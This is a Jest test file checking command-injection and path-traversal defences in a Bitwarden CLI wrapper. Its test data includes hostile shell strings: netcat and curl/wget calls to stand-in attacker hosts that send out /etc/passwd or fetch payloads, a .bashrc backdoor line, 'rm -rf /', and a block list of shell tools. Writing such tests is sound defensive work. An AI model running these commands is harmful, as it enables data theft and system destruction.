import { describe, it, expect } from '@jest/globals';
import {
  sanitizeInput,
  validateParameter,
  buildSafeCommand,
  isValidBitwardenCommand,
  validateFilePath,
} from '../src/utils/security.js';

describe('Security - Command Injection Protection', () => {
  describe('sanitizeInput', () => {
    it('should remove dangerous command separators', () => {
      const input = '; rm -rf /';
      const result = sanitizeInput(input);
      expect(result).toBe('rm -rf /');
      expect(result).not.toContain(';');
    });

    it('should remove logical operators', () => {
      const input = '&& cat /etc/passwd';
      const result = sanitizeInput(input);
      expect(result).toBe('cat /etc/passwd');
      expect(result).not.toContain('&&');
    });

    it('should remove pipe operators', () => {
      const input = '| nc attacker.com 4444';
      const result = sanitizeInput(input);
      expect(result).toBe('nc attacker.com 4444');
      expect(result).not.toContain('|');
    });

    it('should remove command substitution with backticks', () => {
      const input = '`whoami`';
      const result = sanitizeInput(input);
      expect(result).toBe('whoami');
      expect(result).not.toContain('`');
    });

    it('should remove command substitution with $() syntax', () => {
      const input = '$(id)';
      const result = sanitizeInput(input);
      expect(result).toBe('id');
      expect(result).not.toContain('$');
      expect(result).not.toContain('(');
      expect(result).not.toContain(')');
    });

    it('should remove newline injection attempts', () => {
      const input = '\n rm -rf /';
      const result = sanitizeInput(input);
      expect(result).toBe('rm -rf /');
      expect(result).not.toContain('\n');
    });

    it('should remove redirection operators', () => {
      const input = '> /tmp/evil.txt';
      const result = sanitizeInput(input);
      expect(result).toBe('/tmp/evil.txt');
      expect(result).not.toContain('>');
    });

    it('should handle XSS-style injection attempts', () => {
      const input = '<script>alert("xss")</script>';
      const result = sanitizeInput(input);
      expect(result).toBe('scriptalertxss/script');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should handle SQL injection patterns', () => {
      const input = "'; DROP TABLE users; --";
      const result = sanitizeInput(input);
      expect(result).toBe('DROP TABLE users --');
      expect(result).not.toContain("'");
      expect(result).not.toContain(';');
    });

    it('should preserve normal text', () => {
      const input = 'get item myitem';
      const result = sanitizeInput(input);
      expect(result).toBe('get item myitem');
    });

    it('should throw error for non-string input', () => {
      expect(() => sanitizeInput(123 as unknown as string)).toThrow(
        'Input must be a string',
      );
      expect(() => sanitizeInput(null as unknown as string)).toThrow(
        'Input must be a string',
      );
      expect(() => sanitizeInput(undefined as unknown as string)).toThrow(
        'Input must be a string',
      );
    });

    it('should collapse multiple spaces', () => {
      const input = 'get    item     test';
      const result = sanitizeInput(input);
      expect(result).toBe('get item test');
    });

    it('should trim whitespace', () => {
      const input = '  get item test  ';
      const result = sanitizeInput(input);
      expect(result).toBe('get item test');
    });
  });

  describe('validateParameter', () => {
    it('should accept normal values', () => {
      const result = validateParameter('normal-value');
      expect(result).toBe(true);
    });

    it('should accept values with spaces', () => {
      const result = validateParameter('value with spaces');
      expect(result).toBe(true);
    });

    it('should accept special characters that will be handled by spawn', () => {
      const result = validateParameter("value'with'quotes");
      expect(result).toBe(true);
    });

    it('should accept most dangerous characters (spawn handles them safely)', () => {
      const result = validateParameter('value;with;semicolons');
      expect(result).toBe(true);
    });

    it('should reject values with null bytes', () => {
      const result = validateParameter('value\0dangerous');
      expect(result).toBe(false);
    });

    it('should reject values with newlines', () => {
      expect(validateParameter('value\nwith\nnewlines')).toBe(false);
      expect(validateParameter('value\rwith\rcarriage')).toBe(false);
    });

    it('should return false for non-string input', () => {
      expect(validateParameter(123 as unknown as string)).toBe(false);
      expect(validateParameter(null as unknown as string)).toBe(false);
      expect(validateParameter(undefined as unknown as string)).toBe(false);
    });
  });

  describe('buildSafeCommand', () => {
    it('should build simple command with no parameters', () => {
      const result = buildSafeCommand('get');
      expect(result).toEqual(['get']);
    });

    it('should build command with safe parameters', () => {
      const result = buildSafeCommand('get', ['item', 'test-id']);
      expect(result).toEqual(['get', 'item', 'test-id']);
    });

    it('should sanitize base command', () => {
      const result = buildSafeCommand('get; rm -rf /', ['item']);
      expect(result).toEqual(['get rm -rf /', 'item']);
    });

    it('should keep parameters unchanged (spawn handles them safely)', () => {
      const result = buildSafeCommand('get', ['item', 'test; rm -rf /']);
      expect(result).toEqual(['get', 'item', 'test; rm -rf /']);
    });

    it('should handle empty parameters array', () => {
      const result = buildSafeCommand('status', []);
      expect(result).toEqual(['status']);
    });

    it('should handle parameters with quotes (spawn handles them safely)', () => {
      const result = buildSafeCommand('create', ['item', "test'with'quotes"]);
      expect(result).toEqual(['create', 'item', "test'with'quotes"]);
    });

    it('should reject parameters with null bytes', () => {
      expect(() => buildSafeCommand('get', ['item\0malicious'])).toThrow(
        'Invalid parameter detected',
      );
    });

    it('should reject parameters with newlines', () => {
      expect(() => buildSafeCommand('get', ['item\nmalicious'])).toThrow(
        'Invalid parameter detected',
      );
    });
  });

  describe('isValidBitwardenCommand', () => {
    it('should allow all commands used by our CLI handlers', () => {
      // Commands actually used in src/handlers/cli.ts
      const implementedCommands = [
        'lock',
        'sync',
        'status',
        'list',
        'get',
        'generate',
        'create',
        'edit',
        'delete',
        'confirm',
        'move',
        'device-approval',
        'restore',
        'send',
      ];

      implementedCommands.forEach((cmd) => {
        expect(isValidBitwardenCommand(cmd)).toBe(true);
      });
    });

    it('should allow valid Bitwarden commands not yet implemented', () => {
      // Commands in whitelist but not yet implemented in handlers
      const additionalValidCommands = [
        'import',
        'export',
        'serve',
        'config',
        'login',
        'logout',
      ];

      additionalValidCommands.forEach((cmd) => {
        expect(isValidBitwardenCommand(cmd)).toBe(true);
      });
    });

    it('should allow valid commands with parameters', () => {
      expect(isValidBitwardenCommand('get item test-id')).toBe(true);
      expect(isValidBitwardenCommand('list items')).toBe(true);
      expect(isValidBitwardenCommand('create folder test')).toBe(true);
    });

    it('should block dangerous system commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'cat /etc/passwd',
        'wget http://evil.com',
        'curl -X POST',
        'nc -l 4444',
        'bash',
        'sh',
        'python',
        'node',
        'chmod +x',
        'sudo',
      ];

      dangerousCommands.forEach((cmd) => {
        expect(isValidBitwardenCommand(cmd)).toBe(false);
      });
    });

    it('should handle commands with leading/trailing whitespace', () => {
      expect(isValidBitwardenCommand('  get  ')).toBe(true);
      expect(isValidBitwardenCommand(' rm -rf / ')).toBe(false);
    });

    it('should be case-sensitive', () => {
      expect(isValidBitwardenCommand('GET')).toBe(false);
      expect(isValidBitwardenCommand('List')).toBe(false);
      expect(isValidBitwardenCommand('SYNC')).toBe(false);
    });
  });

  describe('Integration Tests - Complete Command Injection Protection', () => {
    it('should prevent command injection through buildSafeCommand', () => {
      // Simulate a malicious ID parameter
      const maliciousId = "; rm -rf /; echo 'hacked'";
      const command = buildSafeCommand('get', ['item', maliciousId]);

      // The command should be returned as an array where spawn() handles it safely
      expect(command).toEqual(['get', 'item', "; rm -rf /; echo 'hacked'"]);

      // Verify base command is still valid
      expect(isValidBitwardenCommand(command[0])).toBe(true);
    });

    it('should prevent complex injection attempts', () => {
      const maliciousInputs = [
        '$(curl http://evil.com/steal-data)',
        '`wget -O- http://attacker.com/payload`',
        '; cat /etc/passwd | nc attacker.com 4444',
        '&& echo "backdoor" >> ~/.bashrc',
        '|| rm -rf /',
      ];

      maliciousInputs.forEach((maliciousInput) => {
        const command = buildSafeCommand('get', ['item', maliciousInput]);

        // Should be returned as array - spawn() will treat malicious input as literal string
        expect(command).toEqual(['get', 'item', maliciousInput]);

        // Base command should still be valid
        expect(isValidBitwardenCommand('get')).toBe(true);
      });
    });

    it('should handle legitimate use cases correctly', () => {
      const legitimateInputs = [
        'my-important-item-123',
        'folder with spaces',
        'item-with-dashes',
        'CamelCaseItem',
        'item_with_underscores',
      ];

      legitimateInputs.forEach((input) => {
        const command = buildSafeCommand('get', ['item', input]);
        expect(command).toEqual(['get', 'item', input]);
        expect(isValidBitwardenCommand('get')).toBe(true);
      });
    });
  });

  describe('validateFilePath - Path Traversal Protection', () => {
    it('should accept valid relative file paths', () => {
      const validPaths = [
        'document.pdf',
        'folder/document.pdf',
        'my-folder/subfolder/file.txt',
        './local-file.txt',
      ];

      validPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(true);
      });
    });

    it('should accept absolute paths on Unix/Linux and Windows', () => {
      const validAbsolutePaths = [
        // Unix/Linux absolute paths
        '/home/user/document.pdf',
        '/tmp/file.txt',
        '/var/data/backup.tar.gz',
        '/usr/local/share/file.json',
        // Windows absolute paths
        'C:\\Users\\Documents\\file.pdf',
        'D:\\Projects\\data.json',
        'E:\\Backup\\archive.zip',
      ];

      validAbsolutePaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(true);
      });
    });

    it('should reject path traversal with ../', () => {
      const maliciousPaths = [
        '../etc/passwd',
        'folder/../../etc/passwd',
        './../../sensitive-file',
        'files/../../../system/config',
      ];

      maliciousPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(false);
      });
    });

    it('should reject path traversal with ..\\', () => {
      const maliciousPaths = [
        '..\\windows\\system32',
        'folder\\..\\..\\system',
        '.\\..\\..\\sensitive-file',
      ];

      maliciousPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(false);
      });
    });

    it('should reject paths ending with ..', () => {
      const maliciousPaths = ['folder/..', 'files/subfolder/..', 'path/to/..'];

      maliciousPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(false);
      });
    });

    it('should reject exactly ".." as path', () => {
      expect(validateFilePath('..')).toBe(false);
    });

    it('should reject paths with null bytes', () => {
      const maliciousPaths = [
        'file.txt\0.pdf',
        'document\0',
        '\0malicious.exe',
      ];

      maliciousPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(false);
      });
    });

    it('should reject UNC paths (network shares)', () => {
      const uncPaths = [
        '\\\\server\\share\\file.txt',
        '\\\\192.168.1.1\\public\\document.pdf',
        '\\\\evil-server\\malware.exe',
      ];

      uncPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(false);
      });
    });

    it('should reject empty or non-string paths', () => {
      expect(validateFilePath('')).toBe(false);
      expect(validateFilePath(null as unknown as string)).toBe(false);
      expect(validateFilePath(undefined as unknown as string)).toBe(false);
      expect(validateFilePath(123 as unknown as string)).toBe(false);
    });

    it('should accept paths with dots that are not traversal patterns', () => {
      const validPaths = [
        'file.with.dots.txt',
        'my.document.pdf',
        '.hidden-file',
        'folder/.config',
      ];

      validPaths.forEach((path) => {
        expect(validateFilePath(path)).toBe(true);
      });
    });
  });
});
